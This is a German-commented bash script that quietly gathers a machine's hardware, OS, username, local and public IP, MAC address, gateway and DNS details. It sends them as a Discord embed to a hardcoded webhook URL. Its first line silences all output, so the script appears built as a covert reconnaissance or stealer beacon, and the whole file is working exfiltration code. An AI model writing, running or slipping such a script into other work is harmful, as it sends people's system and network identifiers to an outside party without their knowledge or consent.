#!/bin/bash
exec >/dev/null 2>&1

WEBHOOK_URL="https://discordapp.com/api/webhooks/1473235429498290176/EL3NFwAAqsoHbU2XKEATon4_4aBZ_vfskR2rmG4c_-eYWPDDcBjto9HW_I0ZB598Mvfz"

# --- Hardware ---
CPU_MODEL=$(lscpu 2>/dev/null | grep -m1 "Model name" | awk -F ':' '{print $2}' | sed 's/^ //')
CPU_CORES=$(nproc 2>/dev/null)
RAM_TOTAL=$(free -h 2>/dev/null | awk '/Mem:/ {print $2}')
GPU=$(lspci 2>/dev/null | grep -iE "vga|3d" | awk -F ':' '{print $3}' | sed 's/^ //' | head -n 1)
DISK_TOTAL=$(lsblk -b -o SIZE,TYPE 2>/dev/null | awk '$2=="disk"{sum+=$1} END {printf "%.2f GB", sum/1024/1024/1024}')

# --- System ---
HOSTNAME=$(hostname)
USER=$(whoami)
OS=$(grep PRETTY_NAME /etc/os-release 2>/dev/null | cut -d= -f2 | tr -d '"')
KERNEL=$(uname -r)
UPTIME=$(uptime -p)
BOOT_TIME=$(who -b | awk '{print $3, $4}')

# --- Netzwerk ---
LOCAL_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
MAC=$(ip link 2>/dev/null | grep "link/ether" | awk '{print $2}' | head -n 1)
GATEWAY=$(ip route 2>/dev/null | grep default | awk '{print $3}')
DNS=$(grep "nameserver" /etc/resolv.conf 2>/dev/null | awk '{print $2}' | paste -sd ", ")
PUBLIC_IP=$(curl -s --max-time 3 https://api.ipify.org)

# Fallbacks falls Werte leer sind
CPU_MODEL=${CPU_MODEL:-"Unbekannt"}
GPU=${GPU:-"Unbekannt"}
DISK_TOTAL=${DISK_TOTAL:-"Unbekannt"}
LOCAL_IP=${LOCAL_IP:-"Unbekannt"}
PUBLIC_IP=${PUBLIC_IP:-"Unbekannt"}

# JSON für Discord
read -r -d '' JSON <<EOF
{
  "embeds": [{
    "title": "📡 System Report",
    "color": 3447003,
    "fields": [
      { "name": "Hostname", "value": "$HOSTNAME", "inline": true },
      { "name": "Benutzer", "value": "$USER", "inline": true },
      { "name": "OS", "value": "$OS", "inline": false },
      { "name": "Kernel", "value": "$KERNEL", "inline": true },
      { "name": "Uptime", "value": "$UPTIME", "inline": true },
      { "name": "Boot-Zeit", "value": "$BOOT_TIME", "inline": false },

      { "name": "CPU", "value": "$CPU_MODEL", "inline": false },
      { "name": "CPU-Kerne", "value": "$CPU_CORES", "inline": true },
      { "name": "RAM", "value": "$RAM_TOTAL", "inline": true },
      { "name": "GPU", "value": "$GPU", "inline": false },
      { "name": "Gesamter Speicher", "value": "$DISK_TOTAL", "inline": false },

      { "name": "Lokale IP", "value": "$LOCAL_IP", "inline": true },
      { "name": "Öffentliche IP", "value": "$PUBLIC_IP", "inline": true },
      { "name": "MAC-Adresse", "value": "$MAC", "inline": false },
      { "name": "Gateway", "value": "$GATEWAY", "inline": true },
      { "name": "DNS-Server", "value": "$DNS", "inline": false }
    ]
  }]
}
EOF

curl -s -H "Content-Type: application/json" \
     -X POST \
     -d "$JSON" \
     "$WEBHOOK_URL" >/dev/null 2>&1
